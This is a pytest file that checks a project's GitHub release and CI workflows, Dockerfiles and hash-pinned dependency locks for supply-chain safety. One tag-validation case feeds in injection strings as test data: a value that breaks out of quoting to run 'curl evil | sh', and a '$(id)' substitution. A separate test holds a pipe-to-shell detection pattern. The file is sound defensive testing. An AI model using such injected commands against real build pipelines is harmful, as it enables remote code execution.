"""Regression tests for the CI/release workflows, images and dependency locks.

    python3 -m pytest scripts/tests -q

Static checks of .github/workflows/*.yml (needs PyYAML), the Dockerfiles,
the bridge's hashed requirement locks and the install docs, plus the
e2e suite's "required" mode.
"""

from __future__ import annotations

import os
import re
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = ROOT / ".github" / "workflows"
BRIDGE = ROOT / "src" / "sigrift" / "bridge"
DOCKERFILES = [
    ROOT / "src" / "gateway" / "Dockerfile",
    BRIDGE / "Dockerfile",
    ROOT / "src" / "sigrift" / "edge" / "Dockerfile",
]
LOCKS = [
    BRIDGE / "requirements.txt",
    BRIDGE / "requirements-test.txt",
    BRIDGE / "requirements-torch-cpu.txt",
    BRIDGE / "requirements-torch-cuda.txt",
]


def workflow(name: str) -> dict:
    yaml = pytest.importorskip("yaml")
    return yaml.safe_load((WORKFLOWS / name).read_text())


def run_scripts(job: dict) -> list[str]:
    return [s["run"] for s in job.get("steps", []) if "run" in s]


# ── release.yml (I3, I5) ────────────────────────────────────────────────


def test_release_never_interpolates_expressions_into_scripts():
    wf = workflow("release.yml")
    for name, job in wf["jobs"].items():
        for script in run_scripts(job):
            assert "${{" not in script, f"{name}: expression inside run:"


def test_release_permissions_are_per_job_and_minimal():
    wf = workflow("release.yml")
    assert wf["permissions"] == {}
    perms = {name: job.get("permissions") for name, job in wf["jobs"].items()}
    assert perms["resolve-version"] == {}
    assert perms["build-images"] == {"contents": "read", "packages": "write"}
    assert perms["merge-manifest"] == {"packages": "write"}
    assert perms["build-tarballs"] == {"contents": "read"}
    assert perms["sbom"] == {"contents": "read"}
    assert perms["sign-and-release"] == {"contents": "write", "id-token": "write"}


def resolve(env: dict, tmp_path: Path) -> tuple[int, str]:
    script = workflow("release.yml")["jobs"]["resolve-version"]["steps"][0]["run"]
    out = tmp_path / "out"
    out.write_text("")
    r = subprocess.run(
        ["bash", "-c", script],
        env={"PATH": os.environ["PATH"], "GITHUB_OUTPUT": str(out), **env},
        capture_output=True,
        text=True,
    )
    return r.returncode, out.read_text()


@pytest.mark.parametrize(
    ("env", "ok", "prerelease"),
    [
        ({"GITHUB_REF_TYPE": "tag", "GITHUB_REF_NAME": "v1.2.3"}, True, "false"),
        ({"GITHUB_REF_TYPE": "tag", "GITHUB_REF_NAME": "v1.2.3-rc2"}, True, "true"),
        (
            {
                "GITHUB_REF_TYPE": "tag",
                "GITHUB_REF_NAME": "v1.2.3",
                "EVENT_NAME": "workflow_dispatch",
                "INPUT_TAG": "v1.2.3",
            },
            True,
            "false",
        ),
        # Dispatched from a branch: the signing identity would not be the tag's.
        (
            {
                "GITHUB_REF_TYPE": "branch",
                "GITHUB_REF_NAME": "main",
                "EVENT_NAME": "workflow_dispatch",
                "INPUT_TAG": "v1.2.3",
            },
            False,
            None,
        ),
        (
            {
                "GITHUB_REF_TYPE": "tag",
                "GITHUB_REF_NAME": "v1.2.3",
                "EVENT_NAME": "workflow_dispatch",
                "INPUT_TAG": 'v1.2.3"; curl evil | sh; "',
            },
            False,
            None,
        ),
        ({"GITHUB_REF_TYPE": "tag", "GITHUB_REF_NAME": "v1$(id)"}, False, None),
        ({"GITHUB_REF_TYPE": "tag", "GITHUB_REF_NAME": "v1.2.3-beta"}, False, None),
    ],
)
def test_release_tag_validation(tmp_path, env, ok, prerelease):
    env = {"OWNER": "SigRift", "EVENT_NAME": "push", "INPUT_TAG": "", **env}
    rc, out = resolve(env, tmp_path)
    assert (rc == 0) == ok, out
    if ok:
        assert f"prerelease={prerelease}" in out and "owner=sigrift" in out


def test_release_candidates_never_move_latest():
    job = workflow("release.yml")["jobs"]["merge-manifest"]
    script = next(
        s["run"] for s in job["steps"] if s.get("name") == "Create multi-arch manifest"
    )
    assert ':latest"' in script
    assert re.search(
        r'if \[ "\$PRERELEASE" != "true" \]; then\s+tags\+=\(-t "ghcr\.io/\$\{OWNER\}/\$\{IMAGE\}:latest"\)',
        script,
    )


def test_release_signs_install_release_and_pins_the_exact_identity():
    text = (WORKFLOWS / "release.yml").read_text()
    assert "certificate-identity-regexp" not in text
    assert "/.github/workflows/release.yml@refs/tags/${VERSION}" in text
    assert (
        "--certificate-oidc-issuer https://token.actions.githubusercontent.com" in text
    )
    tarballs = workflow("release.yml")["jobs"]["build-tarballs"]
    sums = next(
        s["run"] for s in tarballs["steps"] if s.get("name") == "SHA-256 checksums"
    )
    assert "install-release.sh" in sums
    sign = workflow("release.yml")["jobs"]["sign-and-release"]
    signing = next(s["run"] for s in sign["steps"] if "Cosign" in s.get("name", ""))
    assert "install-release.sh" in signing
    files = next(s for s in sign["steps"] if "action-gh-release" in s.get("uses", ""))
    assert "dist/install-release.sh" in files["with"]["files"]
    # No artefact the docs mention may be missing: every .sig named exists.
    assert "install-release.sh.sig" not in text or "install-release.sh" in signing


def test_release_signs_the_stamped_installer(tmp_path):
    """phase1b 5.2: dist/install-release.sh is copied from the stage after
    the INSTALLER_RELEASE stamp, so SHA256SUMS and the signature cover the
    stamped file; the stamp refuses a release below LC_TEMPLATE_SINCE."""
    tarballs = workflow("release.yml")["jobs"]["build-tarballs"]
    build = next(s["run"] for s in tarballs["steps"]
                 if s.get("name") == "Build install-release tarball")
    stamp = build.index("INSTALLER_RELEASE=")
    assert build.index('cp scripts/install-release.sh "$STAGE/"') < stamp < build.index(
        'cp "$STAGE/install-release.sh" dist/install-release.sh')
    assert "cp scripts/install-release.sh dist/" not in build
    snippet = re.search(r"python3 - \"\$VERSION\" \"\$STAGE/install-release.sh\" <<'PY'\n(.*?)\nPY\n",
                        build, re.S).group(1)
    installer = (ROOT / "scripts" / "install-release.sh").read_text()
    for version, ok in (("v0.2.0", True), ("v0.2.0-rc1", True), ("v0.1.5", False),
                        ("v0.0.0-license-test", True)):
        f = tmp_path / ("install-release-%s.sh" % version)
        f.write_text(installer)
        r = subprocess.run([sys.executable, "-c", snippet, version, str(f)],
                           capture_output=True, text=True)
        assert (r.returncode == 0) == ok, (version, r.stderr)
        if ok:
            assert f.read_text().count("\nINSTALLER_RELEASE=%s\n" % version) == 1
        else:
            assert "LC_TEMPLATE_SINCE" in r.stderr and f.read_text() == installer
    f.write_text(installer.replace("INSTALLER_RELEASE=dev", "INSTALLER_RELEASE=v0.2.0"))
    r = subprocess.run([sys.executable, "-c", snippet, "v0.2.0", str(f)], capture_output=True,
                       text=True)
    assert r.returncode == 1 and "exactly one INSTALLER_RELEASE=dev" in r.stderr


def test_no_doc_or_workflow_uses_an_identity_regexp_or_pipe_to_shell():
    paths = list(ROOT.glob("*.md")) + list(WORKFLOWS.glob("*.yml"))
    paths += [ROOT / "scripts" / "install-release.sh"]
    for path in paths:
        text = path.read_text()
        assert "certificate-identity-regexp" not in text, path.name
        for n, line in enumerate(text.splitlines(), 1):
            if "install-release.sh" in line and re.search(
                r"\|\s*(\S+=\S+\s+)*(ba)?sh\b", line
            ):
                pytest.fail(f"{path.name}:{n}: pipes a download into a shell")


# ── ci.yml (I6) ─────────────────────────────────────────────────────────


def test_bridge_tests_aggregator_cannot_pass_on_an_unexplained_skip():
    job = workflow("ci.yml")["jobs"]["bridge-tests"]
    assert set(job["needs"]) == {"changes", "bridge-tests-shard"}
    assert job["if"] == "always()"
    script = run_scripts(job)[0]
    assert '"$CHANGES_RESULT" != "success"' in script
    assert '"$SHARDS_RESULT" = "skipped" ] && [ "$PYTHON_CHANGED" != "true" ]' in script


def test_ci_ok_depends_on_every_job_and_always_runs():
    wf = workflow("ci.yml")
    job = wf["jobs"]["ci-ok"]
    assert job["if"] == "always()"
    expected = set(wf["jobs"]) - {
        "ci-ok",
        "docs-vs-metrics",
        "python-coverage-release-gate",
    }
    assert set(job["needs"]) == expected


def test_ci_installs_hash_checked_locks():
    for name in ("bridge-tests-shard", "shiny-tests"):
        script = "\n".join(run_scripts(workflow("ci.yml")["jobs"][name]))
        assert "--require-hashes" in script, name
        assert "--extra-index-url" not in script, name
        assert "requirements-torch-cpu.txt" in script, name


# ── tests/e2e (I7) ──────────────────────────────────────────────────────


def test_quickstart_browser_failure_keeps_credentials_out_of_ci_output(tmp_path):
    job = workflow("quickstart-smoke.yml")["jobs"]["quickstart-smoke"]
    step = next(
        step
        for step in job["steps"]
        if step.get("name") == "Real browser login, MFA, and dashboard flows"
    )
    # Substitute only pytest with a credential-bearing failure; execute the
    # actual workflow shell and summary Python to verify status propagation.
    python = tmp_path / "e2e-venv/bin/python"
    python.parent.mkdir(parents=True)
    python.write_text(
        f"#!{sys.executable}\n"
        "import os, pathlib, sys\n"
        "if sys.argv[1:3] == ['-m', 'pytest']:\n"
        "    report = next(arg.split('=', 1)[1] for arg in sys.argv if arg.startswith('--junitxml='))\n"
        '    pathlib.Path(report).write_text(\'<testsuites><testsuite><testcase classname="tests.e2e" name="logout"><failure>DUMMY-PRIVATE-COOKIE</failure></testcase></testsuite></testsuites>\')\n'
        "    print('DUMMY-PRIVATE-COOKIE')\n"
        "    raise SystemExit(1)\n"
        f"os.execv({sys.executable!r}, [{sys.executable!r}, *sys.argv[1:]])\n"
    )
    python.chmod(0o700)
    result = subprocess.run(
        ["bash", "-e", "-c", step["run"]],
        cwd=tmp_path,
        env={
            "PATH": os.environ["PATH"],
            "RUNNER_TEMP": str(tmp_path),
            "BASE_URL": "https://fixture.invalid",
        },
        capture_output=True,
        text=True,
        timeout=10,
    )
    assert result.returncode == 1, "The browser failure must fail CI"
    assert "DUMMY-PRIVATE-COOKIE" not in result.stdout + result.stderr
    assert "tests.e2e.logout: failure" in result.stdout
    log = tmp_path / "browser-private.log"
    assert "DUMMY-PRIVATE-COOKIE" in log.read_text()
    assert log.stat().st_mode & 0o777 == 0o600


def e2e_pytest(env: dict, *args: str):
    full = {"PATH": os.environ["PATH"], "PYTHONPATH": str(ROOT / "src"), **env}
    return subprocess.run(
        [sys.executable, "-m", "pytest", "tests/e2e", "-p", "no:cacheprovider", *args],
        cwd=ROOT,
        capture_output=True,
        text=True,
        env=full,
    )


def test_e2e_required_mode_refuses_to_run_without_the_password():
    r = e2e_pytest(
        {"SIGRIFT_E2E_REQUIRED": "1", "BRIDGE_ADMIN_PASSWORD": ""}, "--collect-only"
    )
    assert r.returncode == 4, r.stdout + r.stderr
    assert "BRIDGE_ADMIN_PASSWORD" in r.stdout + r.stderr
    r = e2e_pytest({"BRIDGE_ADMIN_PASSWORD": ""}, "--collect-only", "-q")
    assert r.returncode == 0, r.stdout + r.stderr


def test_e2e_unexpected_skips_become_failures_when_required(tmp_path):
    # Run the real reporting hook in a minimal subprocess. No browser,
    # credentials, application or Playwright dependency is needed here.
    (tmp_path / "conftest.py").write_text((ROOT / "tests/e2e/conftest.py").read_text())
    (tmp_path / "__init__.py").write_text("")
    (tmp_path / "diagnostics.py").write_text(
        (ROOT / "tests/e2e/diagnostics.py").read_text()
    )
    (tmp_path / "test_probe.py").write_text(
        "import pytest\n"
        "@pytest.fixture(autouse=True)\n"
        "def no_uncaught_browser_errors():\n    yield\n"
        "def test_unexpected_skip():\n    pytest.skip('missing prerequisite')\n"
    )
    for required, expected in (("0", 0), ("1", 1)):
        result = subprocess.run(
            [
                sys.executable,
                "-m",
                "pytest",
                str(tmp_path),
                "--confcutdir",
                str(tmp_path),
                "-c",
                os.devnull,
                "-p",
                "no:cacheprovider",
                "-q",
            ],
            env={
                "PATH": os.environ["PATH"],
                "PYTEST_DISABLE_PLUGIN_AUTOLOAD": "1",
                "SIGRIFT_E2E_REQUIRED": required,
                "BRIDGE_ADMIN_PASSWORD": "fixture-only",
            },
            capture_output=True,
            text=True,
        )
        assert result.returncode == expected, result.stdout + result.stderr
        if required == "1":
            assert "Required E2E test skipped" in result.stdout


# ── gitleaks.yml / dep-audit.yml (I11, I9) ──────────────────────────────


def test_gitleaks_download_is_checksummed_before_unpacking():
    job = workflow("gitleaks.yml")["jobs"]["scan"]
    step = next(s for s in job["steps"] if s.get("name") == "Install gitleaks")
    assert re.fullmatch(r"[0-9a-f]{64}", step["env"]["GITLEAKS_SHA256"])
    script = step["run"]
    assert "| tar" not in script
    assert script.index("sha256sum --check") < script.index("tar xzf")


def test_dep_audit_audits_every_shipped_python_dependency_set():
    scripts = run_scripts(workflow("dep-audit.yml")["jobs"]["pip-audit"])
    for lock in ("requirements.txt", "requirements-torch-cuda.txt"):
        audit = [
            script
            for script in scripts
            if "pip-audit --" in script and "src/sigrift/bridge/" + lock in script
        ]
        assert len(audit) == 1, f"Missing or ambiguous audit of {lock}"
        assert "--require-hashes" in audit[0] and "--strict" in audit[0]
        assert "--ignore-vuln" not in audit[0]
    torch = [script for script in scripts if "requirements-torch-cpu.txt" in script]
    assert len(torch) == 1
    assert "pip-audit --disable-pip --no-deps --strict" in torch[0]
    assert "--ignore-vuln" not in torch[0]


# ── images and dependency locks (I9) ────────────────────────────────────


@pytest.mark.parametrize("dockerfile", DOCKERFILES, ids=lambda p: p.parent.name)
def test_base_images_are_pinned_by_digest(dockerfile):
    froms = re.findall(r"^FROM\s+(\S+)", dockerfile.read_text(), re.M)
    assert froms
    for image in froms:
        assert re.fullmatch(r"[\w./-]+:[\w.-]+@sha256:[0-9a-f]{64}", image), image


def test_edge_image_pins_numpy_to_the_bridge_lock():
    text = DOCKERFILES[2].read_text()
    pinned = re.search(r"^ARG NUMPY_VERSION=(\S+)$", text, re.M).group(1)
    assert '"numpy==${NUMPY_VERSION}"' in text
    assert not re.search(
        r"pip install[^\n]*\bnumpy\b(?!==)",
        text.replace('"numpy==${NUMPY_VERSION}"', ""),
    )
    lock = (BRIDGE / "requirements.txt").read_text()
    assert f"\nnumpy=={pinned} \\" in lock


def requirement_blocks(path: Path) -> list[str]:
    """Requirement entries (continuation lines joined), options excluded."""
    entries, current = [], ""
    for line in path.read_text().splitlines():
        if line.lstrip().startswith("#") or not line.strip():
            continue
        current += line.rstrip("\\").strip() + " "
        if not line.endswith("\\"):
            entries.append(current.strip())
            current = ""
    return [e for e in entries if not e.startswith("-")]


@pytest.mark.parametrize("lock", LOCKS, ids=lambda p: p.name)
def test_every_locked_requirement_is_pinned_with_hashes(lock):
    entries = requirement_blocks(lock)
    assert entries
    for entry in entries:
        assert re.match(r"[A-Za-z0-9._-]+==\S+ ", entry), entry
        assert "--hash=sha256:" in entry, entry


def test_no_requirement_file_mixes_indexes():
    for path in BRIDGE.glob("requirements*"):
        text = path.read_text()
        assert "--extra-index-url" not in text, path.name
    torch = (BRIDGE / "requirements-torch-cpu.txt").read_text()
    assert "--index-url https://download.pytorch.org/whl/cpu" in torch


def pins(path: Path) -> dict[str, str]:
    out = {}
    for entry in requirement_blocks(path):
        name, version = entry.split(" ", 1)[0].split("==")
        out[name.lower()] = version
    return out


def test_runtime_lock_has_no_test_tooling_and_test_lock_agrees_with_it():
    runtime = pins(BRIDGE / "requirements.txt")
    test = pins(BRIDGE / "requirements-test.txt")
    for tool in (
        "pytest",
        "pytest-timeout",
        "pytest-xdist",
        "pytest-asyncio",
        "pytest-split",
    ):
        assert tool not in runtime and tool in test
    assert "torch" not in runtime
    for name in set(runtime) & set(test):
        assert runtime[name] == test[name], name
    cuda = pins(BRIDGE / "requirements-torch-cuda.txt")
    for name in set(runtime) & set(cuda):
        assert runtime[name] == cuda[name], name
    # torch is installed --no-deps: its runtime dependencies must be locked.
    for dep in (
        "filelock",
        "fsspec",
        "jinja2",
        "networkx",
        "sympy",
        "typing-extensions",
    ):
        assert dep in runtime, dep


def test_bridge_image_installs_hash_checked_locks_with_torch_from_one_index():
    text = DOCKERFILES[1].read_text()
    code = "\n".join(
        line for line in text.splitlines() if not line.lstrip().startswith("#")
    )
    assert "--extra-index-url" not in code
    assert "pip install --no-cache-dir --require-hashes -r requirements.txt" in text
    cpu = re.search(
        r"pip install --no-cache-dir --require-hashes --no-deps \\\s+"
        r"--index-url https://download\.pytorch\.org/whl/cpu \\\s+"
        r"-r requirements-torch-cpu\.txt",
        text,
    )
    assert cpu
    assert "requirements-test" not in code
    assert "ENV BRIDGE_SECRETS_DIR=/app/secrets" in text
    assert "python3 -m sigrift.bridge.ca migrate-key" in text


# ── .dockerignore / CODEOWNERS (I11) ────────────────────────────────────


def test_dockerignore_excludes_key_material_everywhere():
    lines = set((ROOT / ".dockerignore").read_text().splitlines())
    for pattern in ("**/*.pem", "**/*.key", "**/license.jwt", "**/keys.json"):
        assert pattern in lines, pattern


def test_codeowners_covers_workflows_scripts_and_dockerfiles():
    owned = {
        line.split()[0]
        for line in (ROOT / "CODEOWNERS").read_text().splitlines()
        if line.strip() and not line.startswith("#")
    }
    for path in (
        "/.github/",
        "/scripts/",
        "/src/gateway/Dockerfile",
        "/src/sigrift/bridge/Dockerfile",
        "/src/sigrift/edge/Dockerfile",
    ):
        assert path in owned, path
